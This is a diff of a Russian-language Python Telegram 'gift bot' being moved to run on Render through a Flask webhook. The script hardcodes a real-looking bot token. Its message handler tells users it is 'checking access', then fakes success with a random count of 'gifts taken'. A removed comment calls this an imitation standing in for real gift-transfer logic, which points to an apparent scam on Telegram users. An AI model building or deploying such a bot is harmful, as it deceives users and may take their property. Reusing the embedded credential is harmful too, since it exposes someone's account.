@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 """
 Боевой бот для подарков - Версия для Render с WEBHOOK
+ИСПРАВЛЕННАЯ ВЕРСИЯ
 """
 
 from flask import Flask, request
@@ -17,7 +18,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 # ======================= НАСТРОЙКИ =======================
 BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8634197474:AAHcZ0LpaY08dLJCZvW1GB6NEwJbCPWsLuc")
 YOUR_CHAT_ID = 8585177726  # твой ID
-RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://gift-bot-live.onrender.com")  # URL твоего бота на Render
+RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://gift-bot-live.onrender.com")
 
 # Настройка логирования
 logging.basicConfig(
@@ -29,7 +30,7 @@ logger = logging.getLogger(__name__)
 # Файл для хранения пользователей
 USER_STATES_FILE = "users.json"
 
-# ======================= Flask приложение для webhook =======================
+# ======================= Flask приложение =======================
 app = Flask(__name__)
 
 @app.route('/')
@@ -105,7 +106,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if text == "готово":
             await update.message.reply_text("🔍 Проверяю доступ...")
             
-            # Имитация успеха (твоя реальная логика передач подарков)
             users[user_id]["activated"] = True
             users[user_id]["activated_date"] = datetime.now().isoformat()
             users[user_id]["gifts_taken"] = random.randint(2, 5)
@@ -126,55 +126,51 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("👋 Напиши /start")
 
-# ======================= НАСТРОЙКА WEBHOOK =======================
-async def setup_webhook(app_instance):
-    """Устанавливает webhook при запуске"""
-    webhook_url = f"{RENDER_URL}/webhook"
-    await app_instance.bot.set_webhook(url=webhook_url)
-    logger.info(f"Webhook установлен на {webhook_url}")
-
-# Создаём приложение Telegram
+# ======================= СОЗДАЁМ ПРИЛОЖЕНИЕ TELEGRAM =======================
 application = Application.builder().token(BOT_TOKEN).build()
 application.add_handler(CommandHandler("start", start))
 application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-# Глобальная переменная для bot (нужна во Flask)
 bot = Bot(token=BOT_TOKEN)
+
+async def setup_webhook():
+    """Устанавливает webhook"""
+    webhook_url = f"{RENDER_URL}/webhook"
+    await bot.set_webhook(url=webhook_url)
+    logger.info(f"✅ Webhook установлен на {webhook_url}")
 
 # ======================= ЗАПУСК =======================
 def run_flask():
-    """Запускает Flask в отдельном потоке"""
-    port = int(os.environ.get("PORT", 5000))
+    port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("🤖 GIFT BOT - БОЕВАЯ ВЕРСИЯ С WEBHOOK")
+    print("🤖 GIFT BOT - WEBHOOK VERSION")
     print("=" * 50)
-    print(f"\n📁 Файл пользователей: {USER_STATES_FILE}")
-    print(f"🌐 Webhook URL: {RENDER_URL}/webhook")
-    print("🚀 Бот запускается...\n")
     
-    # Запускаем Flask в фоне
+    # Запускаем Flask в отдельном потоке
     flask_thread = Thread(target=run_flask)
     flask_thread.daemon = True
     flask_thread.start()
     
-    # Устанавливаем webhook и запускаем приложение
+    # Настраиваем webhook и запускаем бота
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
-    async def main():
-        await setup_webhook(application)
+    async def start_bot():
+        await setup_webhook()
         await application.initialize()
         await application.start()
-        logger.info("Бот готов к работе через webhook")
+        logger.info("🚀 Бот готов к работе через webhook")
         
-        # Держим приложение запущенным
+        # Бесконечное ожидание
         while True:
             await asyncio.sleep(60)
     
     try:
-        loop.run_until_complete(main())
+        loop.run_until_complete(start_bot())
     except KeyboardInterrupt:
         loop.run_until_complete(application.stop())
+    except Exception as e:
+        logger.error(f"Критическая ошибка: {e}")
